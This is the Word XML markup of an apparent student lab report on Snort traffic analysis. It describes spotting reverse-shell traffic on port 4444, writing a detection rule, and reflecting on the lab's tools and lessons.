        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rP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4.2: Confirmation message of success</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562C9FF0" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="389481F0" w14:textId="618071B4" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6437AF5F" wp14:editId="5A40AB88">
            <wp:extent cx="4099560" cy="411480"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="9150059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9560" cy="411480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="302E58F0" w14:textId="3640283E" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rP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4.3: Flag needed for completing Task 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70698524" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B259D8F" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 3: Scenario 2 | Reverse-Shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1A2496" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EFA335B" w14:textId="6B3B24E8" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Now, we will view traffic through snort to find anything suspicious. Then we will create a rule against it. Run the sniffer command to start. There are many packets with IP's running through port 4444 using TCP. We will save a log file to check for more information. Now we will write a rule against the attack.</w:t>
      </w:r>
      <w:r w:rsidR="00B74A7E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="548B3E98" wp14:editId="651EE753">
            <wp:extent cx="5486400" cy="160020"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10192454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60020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44636FD8" w14:textId="297D040E" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rP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4.4: Rule created for detecting traffic through port 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468701F8" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F9111FD" w14:textId="77777777" w:rsidR="00DF644C" w:rsidRDefault="00DF644C" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>We will run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A full"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3230AFA7" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72E19E4C" wp14:editId="6AA4F2DD">
            <wp:extent cx="3383280" cy="1280160"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="44202856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3280" cy="1280160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C682E2C" w14:textId="552C4815" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rP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4.5: Confirmation message of success</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E47B9A8" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00DF644C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F8D917F" w14:textId="10CF5DA2" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73C3E547" wp14:editId="4E2D866F">
            <wp:extent cx="4061460" cy="342900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="205006567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1460" cy="342900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2272DB" w14:textId="2C494DED" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>4.6: Flag needed for completing Task 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A92CA4" w14:textId="77777777" w:rsidR="00B74A7E" w:rsidRDefault="00B74A7E" w:rsidP="00B74A7E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67D66950" w14:textId="27931EAC" w:rsidR="001D6E62" w:rsidRDefault="00714B36" w:rsidP="001D6E62">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tools and Resources Used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E469AED" w14:textId="77777777" w:rsidR="00BB7F85" w:rsidRDefault="00BB7F85" w:rsidP="002272C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35B23F27" w14:textId="77777777" w:rsidR="00BB7F85" w:rsidRDefault="00BB7F85" w:rsidP="002272C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Base64 Decode </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.base64decode.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> - Base64 Decode is one half of Base64 Decode and Encode. It is simply used for decoding Base64 data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122D98D5" w14:textId="77777777" w:rsidR="00BB7F85" w:rsidRDefault="00BB7F85" w:rsidP="005B5907">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Snort - </w:t>
      </w:r>
      <w:hyperlink r:id="rId43" w:history="1">
        <w:r w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.snort.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> - Snort is an open-source IPS command line tool used for security monitoring and prevention. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4CD8CD" w14:textId="77777777" w:rsidR="00BB7F85" w:rsidRDefault="00BB7F85" w:rsidP="002272C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tenable - </w:t>
      </w:r>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.tenable.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> – Tenable is used for vulnerability intelligence. In the lab, we used it for seeing the priority/danger score of intrusions. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71261DDE" w14:textId="77777777" w:rsidR="00BB7F85" w:rsidRDefault="00BB7F85" w:rsidP="005B5907">
      <w:r>
        <w:t xml:space="preserve">Ubuntu Linux – </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:history="1">
        <w:r w:rsidRPr="00F90CDE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://ubuntu.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> - Ubuntu is a version of Linux that is comprised of mostly open-source software. It is like Kali Linux in its focus on security.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6135B6DE" w14:textId="77777777" w:rsidR="002272C8" w:rsidRDefault="002272C8" w:rsidP="005B5907"/>
    <w:p w14:paraId="3706DF69" w14:textId="0374C690" w:rsidR="00603AA7" w:rsidRDefault="00714B36" w:rsidP="00603AA7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Challenges Encountered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C57488" w14:textId="49F1C1AD" w:rsidR="002272C8" w:rsidRPr="002272C8" w:rsidRDefault="002272C8" w:rsidP="00FA6FE2">
      <w:r>
        <w:t>Most challenges encountered during Lab Five were with the command line. General errors occurred with spelling and syntax mistakes. There were issues with remembering what each command was</w:t>
      </w:r>
      <w:r w:rsidR="00FC0353">
        <w:t>. Errors were solved eventually.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDFF262" w14:textId="77777777" w:rsidR="00127603" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Results and Findings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33096370" w14:textId="055A3D21" w:rsidR="00603AA7" w:rsidRPr="00603AA7" w:rsidRDefault="00A864CB" w:rsidP="00FA6FE2">
      <w:r>
        <w:t xml:space="preserve">Traffic Analysis Essentials provide necessary knowledge on what network security is and what it is meant for. All Snort labs had hands-on practice for the Snort tool. The Snort tool is relatively simple to understand after knowing how rules are structured and what every command does. </w:t>
      </w:r>
      <w:r w:rsidR="00BB7F85">
        <w:t xml:space="preserve">Though some tasks were tedious in their instructions, the </w:t>
      </w:r>
      <w:r w:rsidR="003D7EF2">
        <w:t>repetitive</w:t>
      </w:r>
      <w:r w:rsidR="00BB7F85">
        <w:t xml:space="preserve"> work does make the user more familiar with the tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CE0F55" w14:textId="77777777" w:rsidR="00193561" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DF3209" w14:textId="3AF345EB" w:rsidR="00BB7F85" w:rsidRPr="00193561" w:rsidRDefault="00BB7F85" w:rsidP="00FA6FE2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BB7F85">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>After completing all four labs, I’ve gained a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> better</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB7F85">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> understanding of traffic analysis and Snort. I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> am </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB7F85">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>confident about using Snort in future projects or in my security career</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB467FC" w14:textId="65BB6359" w:rsidR="00127603" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Future Improvements or Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F4FB87" w14:textId="567571FC" w:rsidR="00980599" w:rsidRPr="00980599" w:rsidRDefault="0061623E" w:rsidP="00980599">
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="00BB7F85">
        <w:t xml:space="preserve"> have no recommendations for this lab in the future.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246BEA2F" w14:textId="1BC5BD52" w:rsidR="003D69D9" w:rsidRPr="003D69D9" w:rsidRDefault="00714B36" w:rsidP="003D69D9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C88301F" w14:textId="77777777" w:rsidR="003D69D9" w:rsidRDefault="003D69D9" w:rsidP="003D69D9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="319E18DD" w14:textId="39265D21" w:rsidR="0025499C" w:rsidRDefault="003D69D9" w:rsidP="003D69D9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Snort Command Cheat Sheet: </w:t>
      </w:r>
      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://assets.tryhackme.com/cheatsheets/Snort%20Cheatsheet%20-%20TryHackMe.pdf</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18854412" w14:textId="77777777" w:rsidR="003D69D9" w:rsidRDefault="003D69D9" w:rsidP="003D69D9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B568B6" w14:textId="1E328222" w:rsidR="003D69D9" w:rsidRPr="00714B36" w:rsidRDefault="003D69D9" w:rsidP="003D69D9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Basic Linux Commands: </w:t>
      </w:r>
      <w:hyperlink r:id="rId47" w:anchor="1-overview" w:history="1">
        <w:r w:rsidRPr="00D74863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://ubuntu.com/tutorials/command-line-for-beginners#1-overview</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="003D69D9" w:rsidRPr="00714B36" w:rsidSect="00714B3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F8E6E" w14:textId="77777777" w:rsidR="00B71EE2" w:rsidRDefault="00B71EE2" w:rsidP="00CA3B80">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="74564E97" w14:textId="77777777" w:rsidR="00B71EE2" w:rsidRDefault="00B71EE2" w:rsidP="00CA3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2FF256" w14:textId="77777777" w:rsidR="00B71EE2" w:rsidRDefault="00B71EE2" w:rsidP="00CA3B80">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="75BDABD1" w14:textId="77777777" w:rsidR="00B71EE2" w:rsidRDefault="00B71EE2" w:rsidP="00CA3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BE9856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F108B5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5DEEEF3C"/>
    <w:lvl w:ilvl="0" w:tplc="C5A4DD9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8D05A4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FF749C3E"/>
